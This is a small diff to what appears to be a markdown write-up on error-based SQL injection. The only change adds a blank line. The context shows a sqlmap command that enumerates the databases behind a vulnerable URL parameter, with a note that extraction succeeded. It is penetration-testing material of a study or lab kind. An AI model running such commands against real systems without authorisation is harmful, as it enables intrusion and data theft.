@@ -23,6 +23,7 @@ Extract database information by triggering and analyzing SQL error messages.
 - **Target Identification**: Final redirected URL containing vulnerable parameter
 - **Tool Usage**: sqlmap without technique restriction for automatic detection
 - **Command**:
+
   ```bash
   sqlmap -u "https://target/index.php?img=1" --batch --dbs
   Result: Successfully extracted database information
